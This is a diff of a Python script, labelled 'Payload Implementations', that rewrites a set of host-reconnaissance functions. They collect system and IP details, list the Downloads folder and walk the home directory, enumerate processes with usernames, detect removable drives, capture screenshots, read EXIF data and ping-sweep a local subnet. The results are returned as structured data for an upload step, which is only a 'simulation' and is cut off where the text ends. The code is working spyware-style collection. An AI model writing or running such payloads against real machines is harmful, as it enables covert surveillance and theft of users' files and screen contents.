@@ -1,90 +1,109 @@
-import os, platform, socket, subprocess
-from pathlib import Path
-from PIL import ImageGrab, Image
+import os
+import platform
+import socket
+import subprocess
 import psutil
+import json
+import time
+from pathlib import Path
+from PIL import ImageGrab, ExifTags, Image
+
+# ==========================
+#  Payload Implementations
+# ==========================
 
 def system_info():
-    print("\n[🧠] System Info")
-    print("  OS:", platform.system(), platform.release())
-    print("  Hostname:", socket.gethostname())
-    try:
-        ip = socket.gethostbyname(socket.gethostname())
-        print("  IP Address:", ip)
-    except:
-        print("  IP Address: unavailable")
+    """Collect basic system information"""
+    info = {
+        "os": platform.system(),
+        "os_version": platform.version(),
+        "platform": platform.platform(),
+        "hostname": socket.gethostname(),
+        "ip_address": socket.gethostbyname(socket.gethostname()),
+        "architecture": platform.machine(),
+        "processor": platform.processor(),
+    }
+    return info
+
 
 def file_access():
-    print("\n[📂] File Access")
+    """List contents of Downloads folder and walk home directory"""
+    downloads = Path.home() / "Downloads"
     home = Path.home()
-    downloads = home / "Downloads"
-    print("  Home Directory:", home)
-    if downloads.exists():
-        print("  Downloads folder contents:")
-        for f in downloads.iterdir():
-            print("   -", f)
-    else:
-        print("  No Downloads folder found.")
 
-def list_processes():
-    print("\n[📋] Running Processes")
-    for proc in psutil.process_iter(['pid', 'name']):
-        print(f"  PID {proc.info['pid']} - {proc.info['name']}")
+    results = {
+        "downloads": [str(f) for f in downloads.glob("*")] if downloads.exists() else [],
+        "home_walk": []
+    }
 
-def detect_usb():
-    print("\n[💾] USB Devices")
-    system = platform.system()
-    try:
-        if system == "Windows":
-            output = subprocess.check_output(
-                "wmic logicaldisk get name, drivetype", shell=True
-            ).decode()
-            for line in output.split("\n"):
-                if "2" in line:
-                    print(" ", line.strip())
-        elif system == "Linux":
-            output = subprocess.check_output(
-                "lsblk -o NAME,MOUNTPOINT", shell=True
-            ).decode()
-            for line in output.split("\n"):
-                if "/media" in line or "/mnt" in line:
-                    print(" ", line.strip())
-        else:
-            print("  [!] USB detection not implemented for this OS.")
-    except Exception as e:
-        print("  [!] Error:", e)
+    for root, dirs, files in os.walk(home):
+        for file in files:
+            results["home_walk"].append(str(Path(root) / file))
+        # stop after 50 files to avoid overload
+        if len(results["home_walk"]) > 50:
+            break
 
-def take_screenshot(output_file="screenshot.png"):
-    print("\n[🖼] Taking Screenshot...")
-    try:
-        img = ImageGrab.grab()
-        img.save(output_file)
-        print(f"  Screenshot saved as {output_file}")
-    except Exception as e:
-        print("  [!] Failed:", e)
+    return results
 
-def extract_exif(image_path):
-    print("\n[🧬] EXIF Metadata")
+
+def running_processes():
+    """List all running processes"""
+    processes = []
+    for proc in psutil.process_iter(['pid', 'name', 'username']):
+        try:
+            processes.append(proc.info)
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return processes
+
+
+def usb_detection():
+    """List connected USB storage devices"""
+    usb_devices = []
+    partitions = psutil.disk_partitions(all=False)
+    for p in partitions:
+        if 'removable' in p.opts or 'cdrom' in p.opts:
+            usb_devices.append({"device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype})
+    return usb_devices
+
+
+def screenshot():
+    """Capture a screenshot and save as PNG"""
+    file_name = f"screenshot_{int(time.time())}.png"
+    image = ImageGrab.grab()
+    image.save(file_name)
+    return {"screenshot_file": file_name}
+
+
+def exif_data(image_path):
+    """Extract EXIF metadata from an image"""
+    metadata = {}
     try:
         img = Image.open(image_path)
-        exif = img.getexif()
-        if not exif:
-            print("  No EXIF metadata found.")
-            return
-        for tag_id, value in exif.items():
-            print(f"  {tag_id}: {value}")
+        exif_data = img._getexif()
+        if exif_data:
+            for tag, value in exif_data.items():
+                decoded = ExifTags.TAGS.get(tag, tag)
+                metadata[decoded] = str(value)
     except Exception as e:
-        print("  [!] Error:", e)
+        metadata["error"] = str(e)
+    return metadata
 
-def network_scan(subnet="192.168.1.0/24"):
-    print("\n[🌐] Network Scan")
-    print(f"  Scanning {subnet} for live hosts...")
-    base_ip = subnet.rsplit(".", 1)[0]
-    for i in range(1, 10):
-        ip = f"{base_ip}.{i}"
-        result = os.system(f"ping -c 1 -w 1 {ip} > /dev/null 2>&1")
-        if result == 0:
-            print(f"  [+] Host UP: {ip}")
 
-def simulate_upload():
-    print("\n[🚨] Upload Simulation")
-    print("  Simulating data upload to https://example.com/demo ... DONE ✅")
+def network_scan():
+    """Simulate a local network scan (ping 192.168.1.x)"""
+    live_hosts = []
+    base_ip = "192.168.1."
+    for i in range(1, 10):  # keep it small for demo
+        ip = base_ip + str(i)
+        try:
+            result = subprocess.run(["ping", "-n", "1", ip], capture_output=True)
+            if result.returncode == 0:
+                live_hosts.append(ip)
+        except Exception:
+            pass
+    return {"live_hosts": live_hosts}
+
+
+def upload_simulation(data):
+    """Simulate sending data to a server"""
